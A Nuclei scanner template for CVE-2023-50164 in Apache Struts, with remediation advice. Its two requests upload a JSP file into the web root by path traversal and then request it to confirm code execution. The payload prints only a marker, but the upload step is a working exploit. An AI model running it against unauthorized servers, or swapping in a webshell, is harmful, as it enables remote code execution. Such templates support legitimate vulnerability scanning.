id: CVE-2023-50164

info:
  name: Apache Struts Arbitrary File Upload RCE (DAST) - CVE-2023-50164
  author: Dev Bui Hieu
  severity: critical
  description: |
    Apache Struts versions before 2.5.33 and 6.3.0.2 are vulnerable to CVE-2023-50164,
    allowing attackers to write files to arbitrary locations via path traversal during file upload.

    This is a DAST-style template, designed for dynamic scanning when full upload endpoints are known. 
    You must provide the full upload endpoint URL when running this template, for example:
    nuclei -t cve-2023-50164.yaml -u http://target.com/upload.action

    If vulnerable, this template attempts to upload a JSP file containing a unique marker string.
    It then verifies execution by visiting the uploaded JSP file directly.

  remediation: |
    Update to Apache Struts 2.5.33 or 6.3.0.2 (or later), where the vulnerability has been patched.
    Avoid using user-supplied file paths for file uploads and validate file paths server-side.

  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-50164
    - https://github.com/NikitaPark/CVE-2023-50164-PoC
  classification:
    cve-id: CVE-2023-50164
    cwe-id: CWE-22
  metadata:
    type: dast
    verified: true
    max-request: 2
  tags: cve,cve2023,struts,rce,upload,path-traversal,dast

variables:
  shellname: "nuclei_{{randstr}}.jsp"
  shellmarker: "NUCLEI-RCE-MARKER-{{randstr}}"
  upload-path: "../../webapps/ROOT/{{shellname}}"

requests:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150
      Accept-Encoding: gzip, deflate

    body: |
      -----------------------------735323031399963166993862150
      Content-Disposition: form-data; name="Upload"; filename="{{shellname}}"
      Content-Type: application/octet-stream

      <% out.println("{{shellmarker}}"); %>
      -----------------------------735323031399963166993862150
      Content-Disposition: form-data; name="uploadFileName"

      {{upload-path}}
      -----------------------------735323031399963166993862150--

    matchers:
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{RootURL}}/{{shellname}}"

    matchers:
      - type: word
        part: body
        words:
          - "{{shellmarker}}"
